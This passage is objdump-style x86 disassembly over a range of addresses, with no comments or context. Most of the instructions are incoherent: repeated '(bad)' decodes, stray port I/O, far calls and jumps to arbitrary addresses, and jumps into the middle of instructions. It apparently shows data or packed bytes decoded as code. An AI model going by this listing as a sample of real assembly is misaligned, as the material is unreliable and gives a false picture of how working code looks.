  4123b4:	pop    edi
  4123b5:	fcmovb st,st(5)
  4123b7:	pop    edx
  4123b8:	rol    DWORD PTR [ebx],1
  4123ba:	int    0x23
  4123bc:	fnstsw WORD PTR [ebx+0x2a]
  4123bf:	lods   eax,DWORD PTR ds:[esi]
  4123c0:	dec    ebx
  4123c1:	sub    BYTE PTR [eax-0x79fc2eaa],0x5b
  4123c8:	dec    edi
  4123c9:	js     0x412415
  4123cb:	pop    ebx
  4123cc:	out    0xc,eax
  4123ce:	fsubr  QWORD PTR [eax+0x238880de]
  4123d4:	adc    BYTE PTR [edi+eiz*2+0x481f22],ah
	...
  412403:	pop    eax
  412404:	and    ebp,eax
  412406:	add    ebx,DWORD PTR [ebx+ebx*2]
  412409:	push   0xfffffffe
  41240b:	jmp    0x412468
  41240d:	jnp    0x4123e0
  41240f:	fisubr DWORD PTR [eax+0x234880ef]
  412415:	add    BYTE PTR [eax+0xce75b13],al
  41241b:	fsub   QWORD PTR [edi-0x57452bda]
  412421:	out    dx,eax
  412422:	imul   ecx,DWORD PTR [edi+0x6a],0xffffffe7
  412426:	add    eax,DWORD PTR [ebp+0x5e]
  412429:	test   al,0x8b
  41242b:	retf   
  41242c:	adc    al,BYTE PTR ss:[ebx+edx*2+0x5a283450]
  412434:	pop    ebx
  412435:	out    0xd2,eax
  412437:	and    DWORD PTR [edx-0xa],0x3
  41243b:	sbb    al,0x56
  41243d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41243e:	clc    
  41243f:	adc    BYTE PTR [ebx-0x711793c9],cl
  412445:	xchg   esi,eax
  412446:	jg     0x4123dc
  412448:	cwde   
  412449:	xchg   ebx,eax
  41244a:	(bad)  
  41244c:	and    ebp,edi
  41244e:	ja     0x41243e
  412450:	xor    bl,BYTE PTR [esi-0x30]
  412453:	push   edx
  412454:	and    al,BYTE PTR [ecx]
  412456:	and    BYTE PTR [edx],0x9b
  412459:	xor    BYTE PTR [ecx+0x66cfa81f],0x35
  412460:	sub    ch,cl
  412462:	test   eax,0x62fe2163
	...
  41248f:	add    BYTE PTR [ebp+0x2e],dl
  412492:	pop    edx
  412493:	and    dh,bl
  412495:	push   ebp
  412496:	add    BYTE PTR [esi+eiz*4+0x74258235],bl
  41249d:	mov    BYTE PTR [ebp+0x6a],dl
  4124a0:	pop    ebp
  4124a1:	out    0x49,al
  4124a3:	test   al,0x1f
  4124a5:	pop    ebx
  4124a6:	jae    0x412497
  4124a8:	fidivr DWORD PTR [edi-0x39]
  4124ab:	sub    ecx,DWORD PTR [ebx+ebx*2]
  4124ae:	mov    ebp,DWORD PTR [edi+ebp*2+0x1394fd92]
  4124b5:	xor    edi,DWORD PTR [eax+0xa215a98]
  4124bb:	sub    DWORD PTR [ebx],esp
  4124bd:	xlat   BYTE PTR ds:[ebx]
  4124be:	sub    ebp,eax
  4124c0:	pop    ds
  4124c1:	pop    ebx
  4124c2:	jg     0x412530
  4124c4:	inc    ebx
  4124c5:	and    bh,dh
  4124c7:	stc    
  4124c8:	pop    ds
  4124c9:	push   edx
  4124ca:	xor    esi,0xd6005b18
  4124d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124d1:	and    eax,0x3a2054fe
  4124d6:	inc    ebp
  4124d7:	sbb    al,0x1b
  4124d9:	and    DWORD PTR [edx],ecx
  4124db:	test   eax,0xe804d822
  4124e0:	pop    ds
  4124e1:	pop    ebx
  4124e2:	std    
  4124e3:	xor    al,0x9c
  4124e5:	and    BYTE PTR [ecx+eiz*4-0x79],dh
  4124e9:	adc    ah,BYTE PTR [esi+0x28]
  4124ec:	sbb    BYTE PTR [ebx],dh
  4124ee:	rcl    BYTE PTR [edi+0x248820ea],cl
	...
  41251c:	add    ah,ch
  41251e:	and    BYTE PTR [eax+eax*1-0x5f],dh
  412522:	mov    al,ds:0xe52df874
  412527:	inc    cx
  412529:	xor    eax,0xb2febdb5
  41252e:	mov    al,ds:0xa0cd4588
  412533:	je     0x412531
  412535:	shl    BYTE PTR [edx],cl
  412537:	imul   BYTE PTR [eax-0x18]
  41253a:	cmp    BYTE PTR [ecx+0x0],al
  41253d:	fucomp st(2)
  41253f:	sti    
  412540:	jmp    DWORD PTR [edx-0x31]
  412543:	inc    esp
  412544:	in     al,0x86
  412546:	pop    ebx
  412547:	in     al,dx
  412548:	add    BYTE PTR [edx],al
  41254a:	fldcw  WORD PTR [eax-0x7ea30b00]
  412550:	jge    0x41255f
  412552:	pop    esp
  412553:	or     eax,0x5c7284
  412558:	add    BYTE PTR [esi+0x5b],dh
  41255b:	in     al,0x0
  41255d:	ret    0x94d8
  412560:	add    ch,al
  412562:	pop    esp
  412563:	std    
  412564:	jne    0x412593
  412566:	mov    ah,0x61
  412568:	ss mov ch,0x5c
  41256b:	mov    DWORD PTR [ebp+0x1d],esi
  41256e:	aad    0xfb
  412570:	mov    ebp,DWORD PTR [ebp-0x74]
  412573:	call   0x66b2f3c9
  412578:	lods   eax,DWORD PTR ds:[esi]
  412579:	adc    DWORD PTR [edi+0x72],esp
  41257c:	or     BYTE PTR [ecx],dl
  41257e:	fs jne 0x412585
	...
  4125a9:	add    BYTE PTR [ecx],dh
  4125ab:	addr16 jmp 0x25d46b5
  4125b1:	or     dh,ch
  4125b3:	fisubr DWORD PTR ds:0xf9dc7f72
  4125b9:	cmp    DWORD PTR [edx],ebx
  4125bb:	pop    eax
  4125bc:	sub    ah,0x55
  4125bf:	mov    bl,0x3
  4125c1:	sbb    BYTE PTR [esi+edx*8],0xc1
  4125c5:	jg     0x41261f
  4125c7:	cmp    al,0x42
  4125c9:	fbld   TBYTE PTR [eax]
  4125cb:	sub    al,0x46
  4125cd:	test   eax,0x744b2ce5
  4125d2:	pop    edx
  4125d3:	dec    ebx
  4125d4:	mov    DWORD PTR [eax+eiz*2-0x4f],ecx
  4125d8:	cmc    
  4125d9:	out    0xab,eax
  4125db:	out    dx,eax
  4125dc:	popa   
  4125dd:	(bad)  
  4125de:	fstp   DWORD PTR [ecx+0x321c0004]
  4125e4:	pop    DWORD PTR [eax+ecx*2-0x1e]
  4125e8:	out    0x0,eax
  4125ea:	xchg   BYTE PTR [edx],dh
  4125ec:	call   0xe873abf0
  4125f1:	call   FWORD PTR [eax+0x34f5dee]
  4125f7:	pop    es
  4125f8:	mov    ecx,0x9325d4a
  4125fd:	shr    BYTE PTR [eax+0x14],0x81
  412601:	jl     0x4125c7
  412603:	xor    esi,esi
  412605:	sbb    esp,ebx
  412607:	(bad)  
  412608:	push   ebp
  412609:	(bad)  
  41260a:	push   ecx
  41260b:	jp     0x412688
  41260d:	je     0x41260f
	...
  412637:	mov    eax,0xcbebf720
  41263c:	sahf   
  41263d:	or     eax,ebp
  41263f:	sub    DWORD PTR ds:0x7ebbfe7d,0x46c5e75c
  412649:	add    al,0x0
  41264b:	stos   DWORD PTR es:[edi],eax
  41264c:	jle    0x4126be
  41264e:	out    0xa5,eax
  412650:	jnp    0x4126cd
  412652:	(bad)  
  412653:	fwait
  412654:	pop    esi
  412655:	ins    BYTE PTR es:[edi],dx
  412656:	out    0x8d,eax
  412658:	imul   edi,DWORD PTR [ebx-0x2],0xffffff8b
  41265c:	pop    esi
  41265d:	push   0x7b7b75e7
  412662:	(bad)  
  412663:	test   eax,0xe3742c5a
  412668:	xor    al,BYTE PTR [eax]
  41266a:	shr    DWORD PTR [edx+0x1f],cl
  41266d:	aaa    
  41266e:	ficom  WORD PTR [esp+ebx*1-0x24]
  412672:	add    esi,ecx
  412674:	rcl    DWORD PTR [ebx+0x121e5f80],cl
  41267a:	add    al,0xb6
  41267c:	xchg   ebp,eax
  41267d:	jbe    0x412675
  41267f:	sbb    esi,DWORD PTR [ebx]
  412681:	call   0x71606151
  412686:	(bad)  
  412687:	aaa    
  412688:	pop    ds
  412689:	aad    0xb
  41268b:	xor    al,0x7c
  41268d:	push   esp
  41268e:	jl     0x4126b2
  412690:	mov    ah,0xe4
  412692:	imul   ebp,DWORD PTR [ecx],0xffffff8e
  412695:	inc    esi
  412696:	jl     0x4126be
  412698:	sbb    esi,DWORD PTR [ebp+ebx*1+0x0]
	...
  4126c3:	add    BYTE PTR [ebx+esi*4-0x41],ch
  4126c7:	dec    edi
  4126c8:	inc    ebx
  4126c9:	pop    ebx
  4126ca:	mov    edi,0x662e1c03
  4126cf:	jmp    0x412697
  4126d1:	mov    dh,0xa8
  4126d3:	add    ecx,DWORD PTR [esi+ebx*1-0x63]
  4126d7:	or     esi,esp
  4126d9:	cmp    ebx,DWORD PTR [ecx+0x5c33da7c]
  4126df:	leave  
  4126e0:	rcr    BYTE PTR [esi],cl
  4126e2:	push   ebp
  4126e4:	(bad)  
  4126e5:	push   ds
  4126e6:	jge    0x4126f3
  4126e8:	mov    ah,0x56
  4126ea:	lahf   
  4126eb:	jl     0x4126a7
  4126ed:	adc    al,0xaa
  4126ef:	add    BYTE PTR [eax+ecx*4],bl
  4126f2:	jb     0x41275c
  4126f4:	sahf   
  4126f5:	pop    ss
  4126f6:	aam    0xd3
  4126f8:	xor    eax,0x9ac2415b
  4126fd:	test   al,0xef
  4126ff:	imul   eax,ebp,0xffffff96
  412702:	mov    esi,0x98947b
  412707:	mov    ch,0x93
  412709:	pop    edi
  41270a:	arpl   WORD PTR [ecx],sp
  41270c:	popa   
  41270d:	push   ds
  41270e:	jle    0x4126f6
  412710:	pop    ds
  412711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412712:	dec    edi
  412713:	adc    eax,ebp
  412715:	mov    ah,0x3f
  412717:	jmp    0xd80d5d6a
  41271c:	pop    ds
  41271d:	pop    ebx
  41271e:	or     DWORD PTR [ecx-0x1116a3b4],ebp
  412724:	aaa    
  412725:	data16 sub BYTE PTR cs:[eax],al
	...
  412751:	sbb    BYTE PTR [esi+0x5aee2de8],al
  412757:	add    dl,dh
  412759:	fild   QWORD PTR [ecx+0x4db7b621]
  41275f:	push   esp
  412760:	push   esi
  412761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412762:	push   eax
  412763:	rcl    ch,0x38
  412766:	mov    ebp,DWORD PTR [eax-0x17]
  412769:	pop    ds
  41276a:	cs mov edi,0x3fb586d1
  412770:	jmp    0xe1b54464
  412775:	xchg   DWORD PTR [esi+0x71],eax
  412778:	es ja  0x4127b1
  41277b:	and    BYTE PTR [ebx-0x2502e29a],dh
  412781:	pop    edi
  412782:	jecxz  0x412781
  412784:	push   cs
  412785:	push   edi
  412786:	sbb    eax,0x561057f3
  41278b:	jae    0x4127db
  41278d:	inc    edi
  41278e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41278f:	cld    
  412790:	test   ah,0x55
  412793:	call   0xfe5e06ff
  412798:	inc    esi
  412799:	popa   
  41279a:	sbb    al,0x5
  41279c:	jmp    0x692df86d
  4127a1:	jecxz  0x4127b0
  4127a3:	test   dh,0x16
  4127a6:	iret   
  4127a7:	inc    ebx
  4127a8:	add    BYTE PTR [ecx+0x9],bl
  4127ab:	push   DWORD PTR [ebp+0x65]
  4127ae:	mov    al,ds:0x425d0c74
  4127b3:	add    BYTE PTR ss:[eax],al
	...
  4127de:	test   DWORD PTR [eax+eax*8+0xf],ecx
  4127e2:	add    BYTE PTR [ebx+0x2],ch
  4127e5:	add    BYTE PTR [ebp-0x68],dh
  4127e8:	inc    esp
  4127e9:	clc    
  4127ea:	jne    0x412845
  4127ec:	add    BYTE PTR [eax],al
  4127ee:	sbb    BYTE PTR [edx],0xee
  4127f1:	inc    DWORD PTR [edx+0x59]
  4127f4:	add    BYTE PTR [edx+0x35],ch
  4127f7:	das    
  4127f8:	(bad)  
  4127f9:	imul   esi,DWORD PTR ds:0x8cfe2f,0xc08d4da7
  412803:	test   eax,0x9cafff6
  412808:	push   DWORD PTR [ebp-0x33]
  41280b:	mov    al,ds:0xb15dfc74
  412810:	xor    al,0x0
  412812:	add    eax,0x74c04e
  412817:	mov    al,0xf5
  412819:	add    ebp,esi
  41281b:	pop    eax
  41281c:	push   0xfe17bdbd
  412821:	(bad)  
  412822:	nop
  412823:	dec    eax
  412824:	call   0xfee2e069
  412829:	push   eax
  41282a:	jle    0x4127b4
  41282c:	mov    WORD PTR [ebp-0x156cb],es
  412832:	mov    ch,0x6
  412834:	out    0x30,al
  412836:	js     0x4127d9
  412838:	dec    BYTE PTR [ecx-0x94bd0]
  41283e:	retf   0x83b1
  412841:	dec    ecx
	...
  41286a:	add    BYTE PTR [edx-0x2eba735e],bh
  412870:	pop    es
  412871:	pop    bp
  412873:	sbb    al,0x9a
  412875:	sar    edi,0x9a
  412878:	(bad)  
  412879:	push   0x781593f6
  41287e:	je     0x412898
  412880:	or     al,BYTE PTR [eax-0x761a7cb5]
  412886:	test   BYTE PTR [ebp+eiz*8+0x77],dl
  41288a:	inc    BYTE PTR [esi]
  41288c:	xor    ch,dl
  41288e:	gs hlt 
  412890:	jb     0x412896
  412892:	jmp    FWORD PTR [ecx+0x5bfe6fd6]
  412898:	int    0xed
  41289a:	or     eax,DWORD PTR [esi+eax*2-0x38]
  41289e:	dec    BYTE PTR [ebx-0x55]
  4128a1:	jge    0x41288a
  4128a3:	dec    ebx
  4128a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a5:	ja     0x412910
  4128a7:	sbb    al,0x5a
  4128a9:	icebp  
  4128aa:	fnsave [bx+di]
  4128ad:	jns    0x412863
  4128af:	cmp    BYTE PTR [ebp-0xdc0189],al
  4128b5:	add    eax,0x78be6de8
  4128ba:	(bad)  
  4128bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128bc:	scas   al,BYTE PTR es:[edi]
  4128bd:	pusha  
  4128be:	test   BYTE PTR [ebx],0x5d
  4128c1:	test   DWORD PTR [eax+ebp*8+0x4cfe775c],eax
  4128c8:	sbb    cl,BYTE PTR [ebx+0x79325d67]
  4128ce:	mov    ah,0x0
	...
  4128f8:	clc    
  4128f9:	inc    esp
  4128fa:	ja     0x4128fa
  4128fc:	jecxz  0x4128bc
  4128fe:	add    eax,0x78be0de8
  412903:	(bad)  
  412904:	daa    
  412905:	jb     0x4128f7
  412907:	sbb    BYTE PTR [edi-0x3c09afa2],bl
  41290d:	and    al,0xfe
  41290f:	je     0x41291d
  412911:	sub    eax,0x5a998f32
  412916:	(bad)  
  412917:	jo     0x4128c3
  412919:	sbb    edi,DWORD PTR [eax]
  41291b:	ins    BYTE PTR es:[edi],dx
  41291c:	mov    eax,ds:0x8678d692
  412921:	inc    esi
  412922:	loop   0x412967
  412924:	andnps xmm2,XMMWORD PTR [edi]
  412927:	ins    BYTE PTR es:[edi],dx
  412928:	lea    edx,[edx-0x2aa58742]
  41292e:	(bad)  
  41292f:	jo     0x4129ab
  412931:	sbb    edx,ebp
  412933:	add    ebx,DWORD PTR [ebx+ebx*2]
  412936:	adc    DWORD PTR [esp+esi*8],eax
  412939:	mov    ds:0x1c63c30f,al
  41293e:	pop    ebp
  41293f:	addr16 push edx
  412941:	sbb    ecx,DWORD PTR [edi-0x70b13788]
  412947:	ins    BYTE PTR es:[edi],dx
  412948:	(bad)  
  412949:	sbb    edi,DWORD PTR [edi-0x76]
  41294c:	cwde   
  41294d:	(bad)  
  41294e:	jle    0x4129c8
  412950:	cmp    dh,BYTE PTR [eax-0x4d701419]
  412956:	test   al,0x3
  412958:	sub    esp,ebp
  41295a:	dec    ebx
  41295b:	jo     0x41295d
	...
  412985:	and    bl,BYTE PTR [ebx]
  412987:	push   edi
  412988:	out    dx,al
  412989:	daa    
  41298a:	add    edi,DWORD PTR [eax]
  41298c:	int3   
  41298d:	adc    bl,BYTE PTR [ebx]
  41298f:	jno    0x412a0f
  412991:	fist   DWORD PTR [edx]
  412993:	aas    
  412994:	js     0x412934
  412996:	fmul   DWORD PTR [edi]
  412998:	jo     0x412994
  41299a:	sbb    ch,al
  41299c:	or     BYTE PTR [eax+0x1c03e7ef],bl
  4129a2:	cmp    DWORD PTR [esi-0x15],0x5c
  4129a6:	pop    ebx
  4129a7:	fs mov esi,0xae0eabcf
  4129ad:	jmp    0x4129c1
  4129af:	pop    es
  4129b0:	js     0x412975
  4129b2:	imul   edi,DWORD PTR [ecx+0x78],0x290066c2
  4129b9:	retf   
  4129ba:	xchg   esi,eax
  4129bb:	sub    DWORD PTR [ebx+eax*2+0x1a],0xd79f5f72
  4129c3:	in     al,0xd6
  4129c5:	sub    ebx,DWORD PTR [ecx]
  4129c7:	add    DWORD PTR [ebp-0x7b],ebx
  4129ca:	fnstsw WORD PTR [ebx-0x1e6fc3f]
  4129d0:	jmp    0xd9a9a850
  4129d5:	pop    ds
  4129d6:	or     bh,BYTE PTR [edi-0x179d924a]
  4129dc:	rcr    BYTE PTR [ecx+ebx*1-0x2],1
  4129e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e1:	lods   eax,DWORD PTR ds:[esi]
  4129e2:	add    dh,dh
  4129e4:	sahf   
  4129e5:	jmp    0x4129ff
  4129e7:	je     0x4129ca
	...
  412a11:	add    bh,al
  412a13:	xchg   BYTE PTR [ebx-0x72],al
  412a16:	retf   
  412a17:	sbb    BYTE PTR [ebp+ecx*4+0x7efe18bb],dh
  412a1e:	dec    ebp
  412a1f:	(bad)  
  412a20:	call   0xfe5a873b
  412a25:	outs   dx,BYTE PTR ds:[esi]
  412a26:	sub    eax,0xc89cfe0e
  412a2b:	adc    dh,bh
  412a2d:	pop    esi
  412a2e:	stos   DWORD PTR es:[edi],eax
  412a2f:	mov    cs,WORD PTR [eax]
  412a31:	inc    ecx
  412a32:	mov    al,ds:0xcf8b4efd
  412a38:	loopne 0x412a78
  412a3a:	xchg   ebx,eax
  412a3b:	sbb    esi,edi
  412a3d:	mov    ah,0x17
  412a3f:	add    ebx,edi
  412a41:	lods   eax,DWORD PTR ds:[esi]
  412a42:	jb     0x412a5d
  412a44:	(bad)  
  412a45:	je     0x412a9b
  412a47:	adc    esi,edi
  412a49:	es jae 0x4129db
  412a4c:	or     BYTE PTR [ecx],dl
  412a4e:	mov    al,cs:0xcf5316fd
  412a54:	rcl    BYTE PTR [esi],1
  412a56:	dec    ebx
  412a57:	sbb    esi,edi
  412a59:	add    BYTE PTR [eax+0x66],cl
  412a5c:	call   0xfed1a285
  412a61:	(bad)  
  412a62:	clc    
  412a63:	mov    dh,0xf6
  412a65:	inc    edx
  412a67:	test   DWORD PTR [ebx],eax
  412a69:	dec    eax
  412a6a:	ret    0xfe90
  412a6d:	mov    ch,0xcd
  412a6f:	mov    dh,bh
  412a71:	call   FWORD PTR [ebp-0x6c]
  412a74:	inc    esi
  412a75:	inc    DWORD PTR [eax]
	...
  412a9f:	bound  edx,QWORD PTR [eax-0x6f35234c]
  412aa5:	(bad)  
  412aa6:	call   0x400370
  412aab:	mov    dl,0xca
  412aad:	loope  0x412aa6
  412aaf:	ret    0xe590
  412ab2:	in     eax,0x3a
  412ab4:	xchg   edx,eax
  412ab5:	(bad)  
  412ab6:	dec    eax
  412ab8:	lods   eax,DWORD PTR ds:[esi]
  412ab9:	idiv   bh
  412abb:	mov    dl,0x85
  412abd:	xlat   BYTE PTR ds:[ebx]
  412abe:	inc    edi
  412abf:	mov    ds:0xb1b5fe90,al
  412ac4:	mov    dh,bh
  412ac6:	inc    edx
  412ac8:	or     cl,BYTE PTR [edx]
  412aca:	(bad)  
  412acb:	cmp    BYTE PTR [ebp-0x18],ah
  412ace:	mov    al,0x90
  412ad1:	(bad)  
  412ad2:	dec    DWORD PTR [eax-0x3d00097f]
  412ad8:	test   DWORD PTR [ebx-0x16e8db9],edi
  412ade:	inc    ebp
  412adf:	ins    DWORD PTR es:[edi],dx
  412ae0:	xchg   edi,edx
  412ae2:	std    
  412ae3:	bound  edx,QWORD PTR [ecx-0x7bbe8a02]
  412ae9:	xlat   BYTE PTR ds:[ebx]
  412aea:	xor    eax,DWORD PTR ds:0xd1c2c75d
  412af0:	pop    esp
  412af1:	push   ebx
  412af2:	mov    edx,DWORD PTR [ecx]
  412af4:	ffree  st(1)
  412af6:	in     al,0x70
  412af8:	sbb    edi,edx
  412afa:	push   eax
  412afb:	sbb    al,0xda
  412afd:	leave  
  412afe:	addr16 pop ebp
  412b00:	add    ch,dl
  412b02:	or     BYTE PTR [eax],al
	...
  412b2c:	xor    al,0xc3
  412b2e:	add    edi,edi
  412b30:	dec    ecx
  412b31:	push   es
  412b32:	push   0xffffffa5
  412b34:	adc    WORD PTR [edx+ecx*1-0x24],si
  412b39:	mov    gs,edx
  412b3b:	dec    edi
  412b3c:	lahf   
  412b3d:	jg     0x412bb7
  412b3f:	add    ebp,DWORD PTR [ecx]
  412b41:	pop    ecx
  412b42:	jae    0x412b73
  412b44:	stos   DWORD PTR es:[edi],eax
  412b45:	inc    edi
  412b46:	jl     0x412ac8
  412b48:	adc    DWORD PTR [edx],ebp
  412b4a:	jno    0x412b4c
  412b4c:	sbb    al,0x2
  412b4e:	in     al,dx
  412b4f:	push   es
  412b50:	pop    ebx
  412b51:	aas    
  412b52:	jl     0x412b47
  412b54:	sbb    eax,0xdeeb0202
  412b59:	enter  0xf7ed,0xf4
  412b5d:	push   ebx
  412b5e:	in     al,dx
  412b5f:	inc    eax
  412b60:	sbb    al,0x87
  412b62:	mov    ebp,0xedd9ece3
  412b67:	xor    bl,BYTE PTR [edx+eax*1]
  412b6a:	add    ebx,0x8d046c18
  412b70:	(bad)  
  412b72:	aam    0x67
  412b74:	and    eax,0x32ffc15a
  412b79:	clts   
  412b7b:	call   0xfeb5f749
  412b80:	pop    ss
  412b81:	inc    edx
  412b82:	lock adc ebp,DWORD PTR [edx+ebx*1+0x3]
  412b87:	add    BYTE PTR [ebx],al
  412b89:	call   0xad32a62
  412b8e:	push   0x3e
	...
  412bb8:	add    BYTE PTR [ecx+0x59],dh
  412bbb:	jae    0x412ba4
  412bbd:	dec    ecx
  412bbe:	leave  
  412bbf:	je     0x412bbf
  412bc1:	repz idiv BYTE PTR [ecx-0x7e]
  412bc5:	imul   ebx,DWORD PTR [ebx+0x1f],0xfd36904
  412bcc:	adc    eax,0x4b171863
  412bd1:	frstor [edx-0x19]
  412bd4:	into   
  412bd5:	xchg   esi,eax
  412bd6:	push   es
  412bd7:	imul   eax,DWORD PTR [eax-0x39],0xffffff84
  412bdb:	out    0xe9,eax
  412bdd:	bound  ebx,QWORD PTR [eax]
  412bdf:	jge    0x412bec
  412be1:	les    ebx,FWORD PTR [ecx-0x1e558b5d]
  412be7:	sub    al,0x78
  412be9:	cmp    eax,DWORD PTR [eax+0x4f]
  412bec:	ret    
  412bed:	fwait
  412bee:	sbb    BYTE PTR ds:0xe799db63,bl
  412bf4:	je     0x412c06
  412bf6:	arpl   di,cx
  412bf8:	jae    0x412b81
  412bfa:	pop    ss
  412bfb:	mov    edi,0x288342eb
  412c00:	add    al,0x4
  412c02:	pop    ebp
  412c03:	out    0x3,eax
  412c05:	pushf  
  412c06:	pop    ss
  412c07:	sbb    eax,0x9c38740c
  412c0c:	je     0x412c68
  412c0e:	pop    ss
  412c0f:	frstor [edx-0x25]
  412c12:	cdq    
  412c13:	out    0x74,eax
  412c15:	shl    BYTE PTR [edx-0x71],1
  412c18:	sub    al,BYTE PTR [ebx+0x17]
  412c1b:	jg     0x412c08
	...
  412c45:	add    BYTE PTR ds:0x3283e75b,bl
  412c4b:	(bad)  
  412c4c:	fild   QWORD PTR [ebx+0x7]
  412c4f:	sbb    BYTE PTR [edi+0x74],ah
  412c52:	and    cl,BYTE PTR [ebp+0x6390745b]
  412c58:	aas    
  412c59:	cmp    bl,BYTE PTR [eax+0x16]
  412c5c:	dec    edi
  412c5d:	dec    edx
  412c5e:	fstp   QWORD PTR [edi-0x19]
  412c61:	into   
  412c62:	xchg   esi,eax
  412c63:	pop    es
  412c64:	imul   edi,DWORD PTR [edi],0xffffffd7
  412c67:	lods   eax,DWORD PTR ds:[esi]
  412c68:	add    BYTE PTR [esi-0x5e97e8fb],bl
  412c6e:	jo     0x412bff
  412c70:	or     BYTE PTR [ecx],dl
  412c72:	inc    esp
  412c73:	cdq    
  412c74:	std    
  412c75:	push   ds
  412c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c77:	lahf   
  412c78:	cld    
  412c79:	push   0xa
  412c7b:	(bad)  
  412c7c:	dec    ecx
  412c7d:	test   al,0x1f
  412c7f:	pop    ebx
  412c80:	or     eax,0x5b5a6d
  412c85:	jmp    0xa3028426
  412c8a:	ficom  WORD PTR [esi]
  412c8c:	(bad)  
  412c8d:	fisubr WORD PTR [ebx]
  412c8f:	(bad)  
  412c90:	(bad)  
  412c91:	call   0xb27d06b5
  412c96:	fistp  DWORD PTR [ebx-0x20e11700]
  412c9c:	mov    cl,0xe8
  412c9e:	pop    ds
  412c9f:	pop    ebx
  412ca0:	add    DWORD PTR [ebx+eax*1],0x1fe93fa1
  412ca7:	data16 test BYTE PTR [edi+0x0],cl
	...
  412cd2:	add    BYTE PTR [ecx],bl
  412cd4:	pop    ebx
  412cd5:	add    BYTE PTR [edx+0x2d],ch
  412cd8:	out    0x49,al
  412cda:	sub    BYTE PTR [eax],bl
  412cdc:	pop    ebx
  412cdd:	or     eax,0x5ba965
  412ce2:	jmp    0x22d28481
  412ce7:	popa   
  412ce8:	push   ss
  412ce9:	(bad)  
  412cea:	neg    BYTE PTR [ebx+0x1fe8ffe2]
  412cf0:	fidivr DWORD PTR [ebx]
  412cf2:	pop    esi
  412cf3:	jae    0x412c90
  412cf5:	add    cl,ch
  412cf7:	push   ds
  412cf8:	fistp  QWORD PTR [ebp-0x18]
  412cfb:	pop    ds
  412cfc:	pop    ebx
  412cfd:	sbb    DWORD PTR [edi+eiz*2],0x1fe93fa1
  412d04:	data16 test bl,bl
  412d07:	and    BYTE PTR [ebx+0x0],bl
  412d0a:	add    ch,ch
  412d0c:	shl    BYTE PTR [ebp+0x41],1
  412d0f:	add    eax,0xd0fefe38
  412d14:	enter  0x414a,0xf5
  412d18:	xchg   esi,eax
  412d19:	inc    esp
  412d1a:	clc    
  412d1b:	jbe    0x412d29
  412d1d:	test   BYTE PTR [eax],0xca
  412d20:	fst    QWORD PTR [ebp+0x1]
  412d23:	lds    ebx,FWORD PTR [ecx+0x29]
  412d26:	not    BYTE PTR [ebx+0x1af87488]
  412d2c:	je     0x412cef
  412d2e:	dec    ebx
  412d2f:	test   BYTE PTR [ecx-0x77],bl
  412d32:	lock mov esi,0x57493
	...
  412d60:	sbb    al,0x51
  412d62:	(bad)  
  412d63:	push   DWORD PTR [ebp+0xe0c5394]
  412d69:	fsub   DWORD PTR [ebp-0x75]
  412d6c:	out    dx,eax
  412d6d:	cli    
  412d6e:	mov    BYTE PTR [ebp+0x71],cl
  412d71:	adc    al,0xff
  412d73:	psllw  mm5,QWORD PTR [edx-0x1]
  412d77:	inc    DWORD PTR [ebp-0x7afef44a]
  412d7d:	pop    ecx
  412d7e:	push   0xfe1fddba
  412d83:	inc    BYTE PTR [edx-0x4f]
  412d86:	xor    esi,DWORD PTR [ecx]
  412d88:	inc    ebp
  412d89:	pop    ecx
  412d8a:	or     eax,eax
  412d8c:	cmp    ah,dl
  412d8e:	icebp  
  412d8f:	add    BYTE PTR ds:0x4d7f8159,dh
  412d95:	pop    ecx
  412d96:	or     eax,0x598f84
  412d9b:	add    BYTE PTR [edx-0x6517f9f0],ch
  412da1:	and    bh,bh
  412da3:	jmp    FWORD PTR [edx+eiz*1+0x10f2ffee]
  412daa:	push   DWORD PTR [ebp+0x1c]
  412dad:	mov    dl,0x72
  412daf:	jbe    0x412dc9
  412db1:	call   0xc3d9:0x9e034608
  412db8:	test   bl,al
  412dba:	add    edi,edi
  412dbc:	imul   edx,DWORD PTR [edx+0x59],0x2022cfd
  412dc3:	or     eax,DWORD PTR [eax]
	...
  412ded:	fmul   QWORD PTR ds:0x21cb389
  412df3:	add    ch,BYTE PTR [edx+0x1c]
  412df6:	jg     0x412dc0
  412df8:	out    0x6c,eax
  412dfa:	mov    bh,0xc8
  412dfc:	jmp    0x412e6a
  412dfe:	call   0xec5d9804
  412e03:	jb     0x412e19
  412e05:	out    0xb9,eax
  412e07:	(bad)  
  412e08:	call   DWORD PTR [esi]
  412e0a:	inc    edx
  412e0b:	add    al,BYTE PTR [ebx+ecx*4-0x56fffdfe]
  412e12:	aas    
  412e13:	push   0x5cb7934f
  412e18:	(bad)  
  412e19:	adc    esi,edx
  412e1b:	outs   dx,DWORD PTR ds:[esi]
  412e1c:	adc    al,0x97
  412e1e:	dec    ecx
  412e1f:	sar    edi,0x26
  412e22:	ret    0x77f8
  412e25:	mov    eax,ds:0xf64f6447
  412e2a:	add    esp,ebx
  412e2c:	push   ebp
  412e2e:	add    al,0xdc
  412e30:	call   FWORD PTR [edx+0x6f]
  412e33:	push   0xbb7d29fe
  412e38:	inc    eax
  412e39:	sbb    al,0xf9
  412e3b:	inc    ecx
  412e3c:	jae    0x412e28
  412e3e:	fdivr  st(5),st
  412e40:	fild   WORD PTR [ebp+ebx*2-0x3b]
  412e44:	(bad)  
  412e45:	xor    edi,DWORD PTR [ebx-0x3b]
  412e48:	fistp  DWORD PTR [ecx+0x234f643f]
  412e4e:	pop    ebx
  412e4f:	fmul   QWORD PTR [edi+0x0]
	...
  412e7a:	test   DWORD PTR [ebx-0x2f],ebx
  412e7d:	or     BYTE PTR [esi-0x8a9a5],al
  412e83:	adc    esi,ebp
  412e85:	adc    BYTE PTR [esi-0x66],0xe7
  412e89:	cld    
  412e8a:	mov    ebx,0xf3dc108e
  412e8f:	adc    eax,DWORD PTR [edi-0x4e]
  412e92:	jmp    0x2699:0xca5bdf8d
  412e99:	jno    0x412e75
  412e9b:	mov    edi,gs
  412e9d:	jo     0x412ee8
